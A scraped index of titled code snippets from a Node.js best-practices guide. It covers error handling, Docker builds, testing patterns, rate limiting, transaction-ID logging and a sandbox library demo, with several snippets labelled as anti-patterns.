);
```

----------------------------------------

TITLE: Example GraphQL Error Response - JSON
DESCRIPTION: This JSON snippet represents the expected response from a GraphQL server when the previous query with an invalid film ID is executed. It shows the standard GraphQL error structure, including the error message, location (line and column), and path to the field that caused the error, alongside a null data entry for the failed field.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/documentingusingswagger.korean.md#_snippet_1

LANGUAGE: json
CODE:
```
{
  "errors": [
    {
      "message": "No entry in local cache for https://swapi.co/api/films/.../",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ],
      "path": [
        "film"
      ]
    }
  ],
  "data": {
    "film": null
  }
}
```

----------------------------------------

TITLE: Configuring cls-rtracer for Microservice Communication
DESCRIPTION: This snippet builds upon the `cls-rtracer` usage by configuring its Express middleware to automatically handle transaction ID propagation for microservice calls. By setting `echoHeader` and `useHeader` to `true`, the middleware ensures the transaction ID is included in outgoing requests and respected in incoming requests, removing the need for manual header management.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/assigntransactionid.md#_snippet_2

LANGUAGE: JavaScript
CODE:
```
// cls-tracer has the ability to store the TransactionId on your service outgoing requests headers, and extract the TransactionId from incoming requests headers, just by overriding the default middleware config
app.use(rTracer.expressMiddleware({
    // Add TransactionId to the header
    echoHeader: true,
    // Respect TransactionId from header
    useHeader: true,
    // TransactionId header name
    headerName: 'x-transaction-id'
}));

const axios = require('axios');

// Now, the external service will automaticlly get the current TransactionId as header
const response = await axios.get('https://externalService.com/api/getAllUsers');
```

----------------------------------------

TITLE: Testing JavaScript Exception Throwing with Mocha/Chai
DESCRIPTION: This snippet illustrates how to use Mocha and Chai to verify that a specific JavaScript exception is thrown under certain conditions. It binds the function call to a context and uses `expect().to.throw()` to assert the expected error type, ensuring error handling is correct within a unit test.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/testingerrorflows.korean.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
describe("Facebook chat", () => {
  it("Notifies on new chat message", () => {
    var chatService = new chatService();
    chatService.participants = getDisconnectedParticipants();
    expect(chatService.sendMessage.bind({ message: "Hi" })).to.throw(ConnectionError);
  });
});

```

----------------------------------------

TITLE: Handling Uncaught Exceptions and Crashing in Typescript
DESCRIPTION: This TypeScript snippet provides a more structured implementation of the error handling pattern. It uses `process.on('uncaughtException')` to catch errors, passes them to a centralized `ErrorHandler` instance. It defines an `AppError` class to explicitly mark errors as operational. The handler logs the error, performs other tasks asynchronously, checks if the error is trusted (either an `AppError` with `isOperational=true` or another known type), and exits the process if it's not trusted.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/shuttingtheprocess.md#_snippet_1

LANGUAGE: typescript
CODE:
```
// Assuming developers mark known operational errors with error.isOperational=true, read best practice #3
process.on('uncaughtException', (error: Error) => {
  errorManagement.handler.handleError(error);
  if(!errorManagement.handler.isTrustedError(error))
    process.exit(1)
});

// centralized error object that derives from Node’s Error
export class AppError extends Error {
  public readonly isOperational: boolean;

  constructor(description: string, isOperational: boolean) {
    super(description);
    Object.setPrototypeOf(this, new.target.prototype); // restore prototype chain
    this.isOperational = isOperational;
    Error.captureStackTrace(this);
  }
}

// centralized error handler encapsulates error-handling related logic
class ErrorHandler {
  public async handleError(err: Error): Promise<void> {
    await logger.logError(err);
    await sendMailToAdminIfCritical();
    await saveInOpsQueueIfCritical();
    await determineIfOperationalError();
  };

  public isTrustedError(error: Error) {
    if (error instanceof AppError) {
      return error.isOperational;
    }
    return false;
  }
}

export const handler = new ErrorHandler();
```

----------------------------------------

TITLE: Examining npm: Understanding the structure of package-lock.json
DESCRIPTION: This snippet provides an example of the package-lock.json file, which is automatically generated by npm version 5 and later. It details the exact versions and sources of all project dependencies, including transitive dependencies, ensuring reproducible builds across different environments and future installs. It's crucial to commit this file to version control.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/lockdependencies.md#_snippet_1

LANGUAGE: json
CODE:
```
{
  "name": "package-name",
  "version": "1.0.0",
  "lockfileVersion": 1,
  "dependencies": {
    "cacache": {
      "version": "9.2.6",
      "resolved": "https://registry.npmjs.org/cacache/-/cacache-9.2.6.tgz",
      "integrity": "sha512-YK0Z5Np5t755edPL6gfdCeGxtU0rcW/DBhYhYVDckT+7AFkCCtedf2zru5NRbBLFk6e7Agi/RaqTOAfiaipUfg=="
    },
    "duplexify": {
      "version": "3.5.0",
      "resolved": "https://registry.npmjs.org/duplexify/-/duplexify-3.5.0.tgz",
      "integrity": "sha1-GqdzAC4VeEV+nZ1KULDMquvL1gQ=",
      "dependencies": {
        "end-of-stream": {
          "version": "1.0.0",
          "resolved": "https://registry.npmjs.org/end-of-stream/-/end-of-stream-1.0.0.tgz",
          "integrity": "sha1-1FlucCc0qT5A6a+GQxnqvZn/Lw4="
        }
      }
    }
  }
}
```

----------------------------------------

TITLE: Implementing Naming Conventions (JavaScript)
DESCRIPTION: Provides examples of standard naming conventions in the Node.js/JavaScript ecosystem, including UPPER_SNAKE_CASE for global/static constants, UpperCamelCase for classes, and lowerCamelCase for functions and scoped variables. Adhering to these conventions improves code readability and helps distinguish between different code elements easily.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_5

LANGUAGE: javascript
CODE:
```
// for global variables names we use the const/let keyword and UPPER_SNAKE_CASE
let MUTABLE_GLOBAL = "mutable value";
const GLOBAL_CONSTANT = "immutable value";
const CONFIG = {
  key: "value",
};

// examples of UPPER_SNAKE_CASE convention in nodejs/javascript ecosystem
// in javascript Math.PI module
const PI = 3.141592653589793;

// https://github.com/nodejs/node/blob/b9f36062d7b5c5039498e98d2f2c180dca2a7065/lib/internal/http2/core.js#L303
// in nodejs http2 module
const HTTP_STATUS_OK = 200;
const HTTP_STATUS_CREATED = 201;

// for class name we use UpperCamelCase
class SomeClassExample {
  // for static class properties we use UPPER_SNAKE_CASE
  static STATIC_PROPERTY = "value";
}

// for functions names we use lowerCamelCase
function doSomething() {
  // for scoped variable names we use the const/let keyword and lowerCamelCase
  const someConstExample = "immutable value";
  let someMutableExample = "mutable value";
}
```

----------------------------------------

TITLE: Executing JavaScript Code using Node.js Sandbox Library
DESCRIPTION: This snippet demonstrates how to use the `sandbox` npm package to execute JavaScript code within an isolated environment. It illustrates basic code execution, attempts to access restricted global objects (like `process`), and shows how the sandbox handles potential infinite loops by enforcing a timeout. The `sandbox` library must be installed as a dependency.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/sandbox.french.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const Sandbox = require('sandbox');
const s = new Sandbox();

s.run('lol)hai', (output) => {
  console.log(output);
  //output='Syntax error'
});

// Example 4 - Restricted code
s.run('process.platform', (output) => {
  console.log(output);
  //output=Null
});

// Example 5 - Infinite loop
s.run('while (true) {}', (output) => {
  console.log(output);
  //output='Timeout'
});
```

----------------------------------------

TITLE: Structuring Application by Technical Layer - Bad Example - Bash
DESCRIPTION: This Bash directory structure demonstrates an anti-pattern where code is organized solely by technical role (controllers, services, models). This approach mixes different business domains within the same technical layer, making it difficult to understand dependencies, maintain individual features, and scale components independently. It's characteristic of a non-modular monolith.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/projectstructre/breakintcomponents.md#_snippet_1

LANGUAGE: bash
CODE:
```
my-system
├─ controllers
│  ├─ user-controller.js
│  ├─ order-controller.js
│  ├─ payment-controller.js
├─ services
│  ├─ user-service.js
│  ├─ order-service.js
│  ├─ payment-service.js
├─ models
│  ├─ user-model.js
│  ├─ order-model.js
│  ├─ payment-model.js
```

----------------------------------------

TITLE: Example Import of Node.js 'http' Module using 'node:' (JavaScript)
DESCRIPTION: Provides a practical example of importing the 'createServer' function from the built-in 'node:http' module using the recommended 'node:' protocol. This syntax ensures clarity and security by explicitly referencing a native module rather than a potentially malicious npm package.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_9

LANGUAGE: javascript
CODE:
```
import { createServer } from "node:http";
```

----------------------------------------

TITLE: Testing API Error Response & Logging (Javascript)
DESCRIPTION: This test shows how to use Sinon to stub dependencies (`OrderRepository`, `logger`) to simulate an error condition during an API request. It then uses Axios to make the request and asserts that the API returns the expected HTTP status code (500) and that the error logger is called with an object containing mandatory error fields (`name`, `status`, `stack`, `message`). This snippet requires Axios, Sinon, and a testing framework like Jest or Mocha.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/testingerrorflows.md#_snippet_1

LANGUAGE: javascript
CODE:
```
test("When exception is throw during request, Then logger reports the mandatory fields", async () => {
  //Arrange
  const orderToAdd = {
    userId: 1,
    productId: 2,
  };

  sinon
    .stub(OrderRepository.prototype, "addOrder")
    .rejects(new AppError("saving-failed", "Order could not be saved", 500));
  const loggerDouble = sinon.stub(logger, "error");

  //Act
  const receivedResponse = await axiosAPIClient.post("/order", orderToAdd);

  //Assert
  expect(receivedResponse.status).toBe(500);
  expect(loggerDouble.lastCall.firstArg).toMatchObject({
    name: "saving-failed",
    status: 500,
    stack: expect.any(String),
    message: expect.any(String),
  });
});
```

----------------------------------------

TITLE: Querying GraphQL API (Failing Example)
DESCRIPTION: Demonstrates a GraphQL query designed to fail by providing an invalid identifier for a film, illustrating how a client might structure a query that triggers an error response from a GraphQL API. It uses the SWAPI schema.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/documentingusingswagger.md#_snippet_0

LANGUAGE: graphql
CODE:
```
# should fail because id is not valid
{
  film(id: "1ZmlsbXM6MQ==") {
    title
  }
}
```

----------------------------------------

TITLE: Importing Built-in Modules using Node Protocol - JavaScript
DESCRIPTION: Demonstrates the syntax for importing Node.js built-in modules using the 'node:' prefix (e.g., node:http). This practice enhances security by preventing typosquatting attacks and improves code clarity by explicitly indicating the module is native. It's recommended to enforce this style using an ESLint rule like 'prefer-node-protocol'.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.hebrew.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
import { functionName } from "node:module"; // note that 'node:' prefix
```

LANGUAGE: JavaScript
CODE:
```
import { createServer } from "node:http";
```

----------------------------------------

TITLE: Setting Docker Memory Limit in Bash
DESCRIPTION: This snippet shows how to set a memory limit for a Docker container directly using the `docker run` command. The `--memory` flag specifies the maximum amount of memory the container is allowed to use. This is one part of the recommended approach for managing Node.js memory in containers.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/memory-limit.french.md#_snippet_0

LANGUAGE: Bash
CODE:
```
docker run --memory 512m my-node-app
```

----------------------------------------

TITLE: Configuring Rate Limiters for Login Attempts (JavaScript)
DESCRIPTION: This JavaScript code snippet configures two rate limiters using the `rate-limiter-flexible` package with a Redis store. The `limiterSlowBruteByIP` limits total failed attempts per IP address per day to 100, blocking the IP for a day upon exceeding the limit. The `limiterConsecutiveFailsByUsernameAndIP` limits consecutive failed attempts for a specific username and IP pair to 10, blocking that pair for an hour upon exceeding the limit. It requires a Redis client and the `rate-limiter-flexible` package.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/login-rate-limit.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const maxWrongAttemptsByIPperDay = 100;
const maxConsecutiveFailsByUsernameAndIP = 10;

const limiterSlowBruteByIP = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail_ip_per_day',
  points: maxWrongAttemptsByIPperDay,
  duration: 60 * 60 * 24,
  blockDuration: 60 * 60 * 24, // Block for 1 day, if 100 wrong attempts per day
});

const limiterConsecutiveFailsByUsernameAndIP = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail_consecutive_username_and_ip',
  points: maxConsecutiveFailsByUsernameAndIP,
  duration: 60 * 60 * 24 * 90, // Store number for 90 days since first fail
  blockDuration: 60 * 60, // Block for 1 hour
});
```

----------------------------------------

TITLE: Configuring Log Routing - Winston - JavaScript (Anti-pattern)
DESCRIPTION: Demonstrates the anti-pattern of configuring log routing directly within the application code using the Winston library. It sets up file transports ('combined.log', 'exceptions.log') and a MongoDB transport, which violates separation of concerns and couples application logic to infrastructure concerns. Changing log destinations requires code modification and redeployment.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/logrouting.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const { createLogger, transports, winston } = require('winston');
/**
   * Requiring `winston-mongodb` will expose
   * `winston.transports.MongoDB`
   */
require('winston-mongodb');
 
// log to two different files, which the application now must be concerned with
const logger = createLogger({
  transports: [
    new transports.File({ filename: 'combined.log' }),
  ],
  exceptionHandlers: [
    new transports.File({ filename: 'exceptions.log' })
  ]
});
 
// log to MongoDB, which the application now must be concerned with
winston.add(winston.transports.MongoDB, options);
```

----------------------------------------

TITLE: Anti-Pattern: Using npm start as CMD in Dockerfile
DESCRIPTION: This Dockerfile demonstrates an anti-pattern for running Node.js applications in containers. Using `CMD ["npm", "start"]` results in `npm` being the root process (PID 1), while the Node.js application runs as a sub-process. This typically prevents signals like SIGTERM from being correctly propagated to the Node.js process, hindering graceful shutdown implementation.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/graceful-shutdown.french.md#_snippet_2

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim

# Build logic comes here

CMD ["npm", "start"]
#Now Node will run a sub-process of npm and won't receive signals
```

----------------------------------------

TITLE: Antipattern: Starting Node.js App with CMD npm start - Dockerfile
DESCRIPTION: Illustrates an antipattern where `CMD "npm start"` is used. This is discouraged because `npm` does not forward signals properly, preventing graceful shutdowns and potentially leaving zombie child processes, and also adds an unnecessary process layer.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/bootstrap-using-node.md#_snippet_2

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm cache clean --force

# don’t do that!
CMD "npm start"
```

----------------------------------------

TITLE: Using continuation-local-storage for Transaction IDs in Node.js Express
DESCRIPTION: This JavaScript snippet demonstrates how to use the `continuation-local-storage` library to create a request-specific context and store a unique transaction ID within an Express route handler. This ID can then be accessed by downstream functions or modules (like a logger or service) to correlate log entries belonging to the same request. It requires the `continuation-local-storage` library as a dependency.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/assigntransactionid.korean.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// when receiving a new request, start a new isolated context and set a transaction Id. The following example is using the npm library continuation-local-storage to isolate requests

const { createNamespace } = require('continuation-local-storage');
var session = createNamespace('my session');

router.get('/:id', (req, res, next) => {
    session.set('transactionId', 'some unique GUID');
    someService.getById(req.params.id);
    logger.info('Starting now to get something by Id');
});

// Now any other service or components can have access to the contextual, per-request, data
class someService {
    getById(id) {
        logger.info(“Starting to get something by Id”);
        // other logic comes here
    }
}

// The logger can now append the transaction-id to each entry so that entries from the same request will have the same value
class logger {
    info (message)
    {console.log(`${message} ${session.get('transactionId')}`);}
}
```

----------------------------------------

TITLE: Handling Statement Separation Pitfalls (JavaScript)
DESCRIPTION: Illustrates correct and incorrect ways to separate statements in JavaScript, highlighting potential issues with Automatic Semicolon Insertion (ASI) when line breaks are used improperly, particularly with immediately invoked function expressions (IIFEs) and spread syntax at the start of a line. Using linters like ESLint or formatters like Prettier can help avoid these syntax errors.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_4

LANGUAGE: javascript
CODE:
```
// Do
function doThing() {
    // ...
}

doThing()

// Do

const items = [1, 2, 3]
items.forEach(console.log)

// Avoid — throws exception
const m = new Map()
const a = [1,2,3]
[...m.values()].forEach(console.log)
> [...m.values()].forEach(console.log)
>  ^^^
> SyntaxError: Unexpected token ...

// Avoid — throws exception
const count = 2 // it tries to run 2(), but 2 is not a function
(function doSomething() {
  // do something amazing
}())
```

----------------------------------------

TITLE: Copying Application Files and Running Build Step (Dockerfile)
DESCRIPTION: Shows the Dockerfile instructions following the initial dependency installation. It involves copying the rest of the application source code into the image and then executing a build command, such as compiling TypeScript, in a separate layer.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/use-cache-for-shorter-build-time.md#_snippet_2

LANGUAGE: Dockerfile
CODE:
```
COPY . .
RUN npm run build
```

----------------------------------------

TITLE: Anti-Pattern: Installing All Dependencies in Dockerfile
DESCRIPTION: This snippet demonstrates an anti-pattern where `npm install` is used without the `--production` flag and the cache is not cleaned. This results in development dependencies being included in the final image, which increases its size and potential attack surface, making it unsuitable for production deployment.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/install-for-production.md#_snippet_2

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
# Two mistakes below: Installing dev dependencies, not deleting the cache after npm install
RUN npm install

# The rest comes here
```

----------------------------------------

TITLE: Anti-Pattern: Installing All Dependencies in Dockerfile
DESCRIPTION: An example of an anti-pattern where `npm install` is used without `--production`, resulting in development dependencies being included in the final image. It also fails to clean the npm cache, contributing to a larger image size and increased attack surface.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/install-for-production.french.md#_snippet_2

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
# Two mistakes below: Installing dev dependencies, not deleting the cache after npm install
RUN npm install

# The rest comes here
```

----------------------------------------

TITLE: Configuring Nginx for Gzip and Static Files
DESCRIPTION: This Nginx configuration snippet demonstrates how to offload tasks like gzip compression and serving static files from a Node.js application. It sets up gzip compression, defines an upstream group for Node.js instances, and configures a server block to listen on ports 80 and 443 (with SSL), serving specific static file types from a designated root directory.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/delegatetoproxy.md#_snippet_0

LANGUAGE: Nginx configuration
CODE:
```
# configure gzip compression
gzip on;
gzip_comp_level 6;
gzip_vary on;

# configure upstream
upstream myApplication {
    server 127.0.0.1:3000;
    server 127.0.0.1:3001;
    keepalive 64;
}

#defining web server
server {
    # configure server with ssl and error pages
    listen 80;
    listen 443 ssl;
    ssl_certificate /some/location/sillyfacesociety.com.bundle.crt;
    error_page 502 /errors/502.html;

    # handling static content
    location ~ ^/(images/|img/|javascript/|js/|css/|stylesheets/|flash/|media/|static/|robots.txt|humans.txt|favicon.ico) {
    root /usr/local/silly_face_society/node/public;
    access_log off;
    expires max;
}

```

----------------------------------------

TITLE: Catching Uncaught Exceptions and Crashing in Javascript
DESCRIPTION: This JavaScript snippet shows how to use `process.on('uncaughtException')` to handle unhandled errors. It passes the error to a centralized `errorHandler` that logs the error and performs other actions (like notifying admins). It then checks if the error is 'trusted' (operational) using `isTrustedError` and exits the process immediately with a non-zero status code if it's not trusted.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/shuttingtheprocess.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// Assuming developers mark known operational errors with error.isOperational=true, read best practice #3
process.on('uncaughtException', (error) => {
  errorManagement.handler.handleError(error);
  if(!errorManagement.handler.isTrustedError(error))
    process.exit(1)
});

// centralized error handler encapsulates error-handling related logic
function errorHandler() {
  this.handleError = (error) => {
    return logger.logError(error)
      .then(sendMailToAdminIfCritical)
      .then(saveInOpsQueueIfCritical)
      .then(determineIfOperationalError);
  }

  this.isTrustedError = (error) => {
    return error.isOperational;
  }
}
```

----------------------------------------

TITLE: Initializing Node.js Web Server with Dynamic Port (JavaScript)
DESCRIPTION: This snippet demonstrates how to initialize an Express web server in Node.js, selecting the listening port based on the environment. It uses `process.env.PORT` for a fixed port in production (or when the environment variable is set) and defaults to `0` for testing, which requests an ephemeral port from the operating system. The function returns the initialized Express app instance after the server starts listening.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/randomize-port.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// api-under-test.js
const initializeWebServer = async () => {
  return new Promise((resolve, reject) => {
    // Fixed port in production, a zero port (ephemeral) for testing
    const webServerPort = process.env.PORT ? process.env.PORT : 0;
    expressApp = express();
    connection = expressApp.listen(webServerPort, () => {
      // No port
      resolve(expressApp);
    });
  });
};

// test.js
beforeAll(async () => {
  expressApp = await initializeWebServer(); // No port
});
```

----------------------------------------

TITLE: Anti-Pattern: Handling Errors Directly in Middleware - Node.js Javascript
DESCRIPTION: Shows an anti-pattern where an Express-style middleware directly handles error processing (logging, sending mail based on severity) instead of delegating to a centralized handler. This makes reusing the logic for errors originating outside the request lifecycle difficult. Requires `logger`, `mailer`, and configuration objects.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/centralizedhandling.md#_snippet_4

LANGUAGE: javascript
CODE:
```
// middleware handling the error directly, who will handle Cron jobs and testing errors?
app.use((err, req, res, next) => {
  logger.logError(err);
  if (err.severity == errors.high) {
    mailer.sendMail(configuration.adminMail, 'Critical error occured', err);
  }
  if (!err.isOperational) {
    next(err);
  }
});
```

----------------------------------------

TITLE: Testing Express Middleware without Authentication Header (Jest/Mocha Syntax)
DESCRIPTION: This code snippet demonstrates how to test a middleware function in isolation using `node-mocks-http` and Jest (or Mocha) syntax. It creates mock request and response objects, invokes the middleware with a request lacking an authentication header, and asserts that the response status code is 403 Forbidden, verifying the middleware's behavior for unauthenticated requests.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/test-middlewares.md#_snippet_0

LANGUAGE: javascript
CODE:
```
//the middleware we want to test
const unitUnderTest = require("./middleware");
const httpMocks = require("node-mocks-http");
//Jest syntax, equivalent to describe() & it() in Mocha
test("A request without authentication header, should return http status 403", () => {
  const request = httpMocks.createRequest({
    method: "GET",
    url: "/user/42",
    headers: {
      authentication: ""
    }
  });
  const response = httpMocks.createResponse();
  unitUnderTest(request, response);
  expect(response.statusCode).toBe(403);
});
```

----------------------------------------

TITLE: Implementing AAA Test Structure in JavaScript
DESCRIPTION: This snippet demonstrates a unit test structured according to the Arrange, Act, Assert (AAA) pattern. It shows how to separate the test setup (Arrange), the execution of the unit under test (Act), and the verification of the results (Assert) for clarity. Dependencies include a testing framework (like Jest/Mocha) and potentially a mocking library (like Sinon).
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/aaa.md#_snippet_0

LANGUAGE: javascript
CODE:
```
describe.skip('Customer classifier', () => {
    test('When customer spent more than 500$, should be classified as premium', () => {
        //Arrange
        const customerToClassify = {spent:505, joined: new Date(), id:1}
        const DBStub = sinon.stub(dataAccess, 'getCustomer')
            .reply({id:1, classification: 'regular'});

        //Act
        const receivedClassification = customerClassifier.classifyCustomer(customerToClassify);

        //Assert
        expect(receivedClassification).toMatch('premium');
    });
});
```

----------------------------------------

TITLE: Extending Built-in Error with AppError (TypeScript)
DESCRIPTION: Shows how to extend the built-in Error class in TypeScript using the `class` syntax to create a custom `AppError`. It demonstrates setting up the prototype chain explicitly (`Object.setPrototypeOf`) to correctly handle inheritance from Error in some environments and using `Error.captureStackTrace` to retain the stack trace, along with adding custom properties.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/useonlythebuiltinerror.md#_snippet_3

LANGUAGE: typescript
CODE:
```
// centralized error object that derives from Node’s Error
export class AppError extends Error {
  public readonly name: string;
  public readonly httpCode: HttpCode;
  public readonly isOperational: boolean;

  constructor(name: string, httpCode: HttpCode, description: string, isOperational: boolean) {
    super(description);

    Object.setPrototypeOf(this, new.target.prototype); // restore prototype chain

    this.name = name;
    this.httpCode = httpCode;
    this.isOperational = isOperational;

    Error.captureStackTrace(this);
  }
}

// client throwing an exception
if(user == null)
    throw new AppError(commonErrors.resourceNotFound, commonHTTPErrors.notFound, 'further explanation', true)
```

----------------------------------------

TITLE: Anti-Pattern: Nested Callback Error Handling - TypeScript
DESCRIPTION: Presents the 'callback hell' anti-pattern in TypeScript, demonstrating the same issues of deep nesting and repetitive error checks (`if(err !== null)`) as in JavaScript, despite the added type annotations. This pattern is difficult to manage and is discouraged in favor of Promises or Async/Await.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/asyncerrorhandling.md#_snippet_3

LANGUAGE: TypeScript
CODE:
```
getData(someParameter, function(err: Error | null, resultA: ResultA) {
  if(err !== null) {
    // do something like calling the given callback function and pass the error
    getMoreData(resultA, function(err: Error | null, resultB: ResultB) {
      if(err !== null) {
        // do something like calling the given callback function and pass the error
        getMoreData(resultB, function(resultC: ResultC) {
          getMoreData(resultC, function(err: Error | null, d: ResultD) {
            if(err !== null) {
              // you get the idea?
            }
          })
        });
      }
    });
  }
});
```

----------------------------------------

TITLE: Nested Callback Error Handling Anti-Pattern (JavaScript)
DESCRIPTION: This snippet illustrates the 'callback hell' anti-pattern, where asynchronous operations are deeply nested within callbacks. It shows how error handling becomes repetitive and scattered, requiring individual error checks (`if(err !== null)`) within each nested function, making the code harder to read, maintain, and reason about compared to Promise-based approaches.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/asyncerrorhandling.korean.md#_snippet_1

LANGUAGE: javascript
CODE:
```
getData(someParameter, function(err, result) {
    if(err !== null) {
        // do something like calling the given callback function and pass the error
        getMoreData(a, function(err, result) {
            if(err !== null) {
                // do something like calling the given callback function and pass the error
                getMoreData(b, function(c) {
                    getMoreData(d, function(e) {
                        if(err !== null ) {
                            // you get the idea? 
                        }
                    })
                });
            }
        });
    }
});
```

----------------------------------------

TITLE: Testing API HTTP Error Codes with JavaScript Request
DESCRIPTION: This example demonstrates testing an API endpoint to ensure it returns the expected HTTP error status code for invalid input. It uses a `httpRequest` utility and a `.catch` block to handle the error response from an asynchronous call, asserting the status code using `expect().to.equal()`. The `done()` callback is used to signal test completion in an asynchronous Mocha test.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/testingerrorflows.korean.md#_snippet_1

LANGUAGE: JavaScript
CODE:
```
it("Creates new Facebook group", function (done) {
  var invalidGroupInfo = {};
  httpRequest({
    method: 'POST',
    uri: "facebook.com/api/groups",
    resolveWithFullResponse: true,
    body: invalidGroupInfo,
    json: true
  }).then((response) => {
    // if we were to execute the code in this block, no error was thrown in the operation above
  }).catch(function (response) {
    expect(400).to.equal(response.statusCode);
    done();
  });
});

```

----------------------------------------

TITLE: Anti-Pattern: Sync Function Returning Promise in Javascript
DESCRIPTION: This snippet demonstrates an anti-pattern where a function `syncFn` is declared as synchronous but returns a promise (by calling the async function `throwAsync`). When an error occurs within the returned promise, the `syncFn` frame is missing from the stacktrace because the v8 engine's async stacktrace mechanism doesn't track non-async functions that return promises.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/returningpromises.md#_snippet_2

LANGUAGE: javascript
CODE:
```
async function throwAsync () {
  await null // need to await at least something to be truly async (see note #2)
  throw Error('missing syncFn in the stacktrace')
}

function syncFn () {
  return throwAsync()
}

async function asyncFn () {
  return await syncFn()
}

// 👎 syncFn would be missing in the stacktrace because it returns a promise while being sync
asyncFn().catch(console.log)
```

----------------------------------------

TITLE: Defining Descriptive Test Names (JavaScript)
DESCRIPTION: This JavaScript snippet illustrates a recommended test naming convention. It structures the test name (`it` block) to clearly state the scenario ("When no price is specified") and the expected outcome ("then the product status is pending approval"), making the test's purpose explicit without reading the code body. This helps testers and DevOps understand the requirements being verified.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/3-parts-in-name.md#_snippet_0

LANGUAGE: javascript
CODE:
```
//1. unit under test
describe('Products Service', () => {
  describe('Add new product', () => {
    //2. scenario and 3. expectation
    it('When no price is specified, then the product status is pending approval', () => {
      const newProduct = new ProductService().add(...);
      expect(newProduct.status).to.equal('pendingApproval');
    });
  });
});
```

----------------------------------------

TITLE: Implementing Rate Limiting with rate-limiter-flexible (Node.js)
DESCRIPTION: This snippet demonstrates how to use the `rate-limiter-flexible` library with Redis to implement rate limiting in a pure Node.js HTTP server. It configures a limiter for 20 requests per second per IP address and returns a 429 status code if the limit is exceeded.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/limitrequests.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const http = require('http');
const IoRedis = require('ioredis');
const { RateLimiterRedis } = require('rate-limiter-flexible');

const redisClient = new IoRedis({ enableOfflineQueue: false });

// Maximum 20 requests per second
const rateLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  points: 20,
  duration: 1,
  blockDuration: 2, // block for 2 seconds if consumed more than 20 points per second
});

http.createServer(async (req, res) => {
   try {
   const rateLimiterRes = await rateLimiter.consume(req.socket.remoteAddress);
   // Some app logic here

   res.writeHead(200);
   res.end();
   } catch {
   res.writeHead(429);
   res.end('Too Many Requests');
   }
})
  .listen(3000);
```

----------------------------------------

TITLE: Multi-Stage Docker Build with Different Base Images (Node.js)
DESCRIPTION: This Dockerfile demonstrates a multi-stage build for a Node.js application using different base images. It uses a standard Node.js image for the build stage and a minimal Alpine-based Node.js image for the runtime stage. This approach significantly reduces the final image size by using a smaller base operating system while still leveraging a full environment for building.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/multi_stage_builds.md#_snippet_2

LANGUAGE: Dockerfile
CODE:
```
FROM node:14.4.0 AS build

COPY --chown=node:node . .
RUN yarn install --frozen-lockfile && yarn build


# This will use a minimal base image for the runtime
FROM node:14.4.0-alpine

USER node
EXPOSE 8080

# Copy results from previous stage
COPY --chown=node:node --from=build /home/node/app/dist /home/node/app/package.json /home/node/app/yarn.lock ./
RUN yarn install --frozen-lockfile --production

